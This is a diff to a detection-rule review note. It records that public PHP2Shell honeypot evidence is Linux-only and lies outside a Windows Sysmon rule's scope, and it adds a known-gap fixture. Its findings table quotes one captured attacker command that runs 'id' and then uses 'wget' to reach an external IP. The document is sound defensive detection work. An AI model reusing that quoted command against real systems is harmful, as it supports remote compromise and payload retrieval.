@@ -56,3 +56,27 @@ Synthetic fixtures under tests/cases/DAC-WIN-0365/; result: **not run** (no SIEM
 
 ## Reviewer status
 pending
+
+## Update 2026-10-26: public PHP2Shell honeypot evidence (reference only)
+
+### Evidence
+- Report: https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md
+- Dataset: https://github.com/0x4D31/honeypot-data/tree/main/reports/php2shell/2026-10-24-rce-evidence (commit 0b6a57491134c10f7cc5055999f1cb8b38c67546)
+- Licence: CC-BY-4.0, owner 0x4D31. The attribution entry is added to THIRD_PARTY_NOTICES.md in PR #95 (DAC-CS-0245).
+
+### Result for this rule (by logic, not executed)
+0 of the 35 published shells, before and after. All 35 are Linux: PHP 8.4.26 under Apache mod_php, `/usr/sbin/apache2` (uid 33) starting `/bin/sh -c`. This rule only reads Windows Sysmon, excludes `sourcetype="sysmon:linux"`, and only matches `php-cgi.exe`/`php.exe`/`w3wp.exe` parents with `cmd`/`powershell`/`pwsh` children. This is the Linux gap already documented above, not a new bug.
+
+### What changed
+- Report and dataset URLs added to `references`.
+- Description now says the public execution evidence is Linux-only and outside this rule's scope, and that no public Windows PHP2Shell execution evidence was found in the sources reviewed.
+- One known-gap fixture, `knowngap_linux_apache_honeypot_out_of_scope_derived.json` (A01 and B16 with their child processes), field-mapped from Tetragon into a Sysmon for Linux EventID 1 shape. Derived from public honeypot evidence 0x4D31/honeypot-data (CC-BY-4.0), not native Sysmon telemetry, not run. Existing synthetic fixtures unchanged.
+- Query, sourcetypes, `allowed_sourcetype_macros` and the sourcetype allowlist are **not** changed. Covering Linux in Splunk (for example `sysmon:linux` or auditd) needs Debarshi's approval first. Linux coverage sits in DAC-MDE-0096 and DAC-CS-0245.
+
+### Ponytail findings (this change)
+| # | Sev | Finding | Failing input | Fix applied |
+|---|---|---|---|---|
+| 1 | Info | Real PHP2Shell execution seen publicly is Linux-only; this rule cannot see it | A01 `/usr/sbin/apache2 -> /bin/sh -c -- "id>/tmp/x1;...;wget -q http://15.204.59.70:8081/ok33"` | Documented as out of scope; known-gap fixture added; no query change |
+
+### Still unverified
+- No Windows PHP2Shell execution telemetry found in public sources. The Windows parent/child assumptions remain unverified.
